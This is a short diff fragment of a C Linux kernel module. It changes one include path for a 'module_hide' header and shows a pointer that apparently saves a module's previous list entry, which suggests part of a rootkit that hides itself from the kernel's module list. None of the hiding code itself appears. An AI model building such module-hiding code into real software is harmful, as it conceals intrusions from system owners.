@@ -18,7 +18,7 @@
 
 #include <linux/module.h>
 
-#include "proc/module_hide.h"
+#include "ctrl/module_hide.h"
 
 static struct list_head* _p_prev_module = NULL;
 
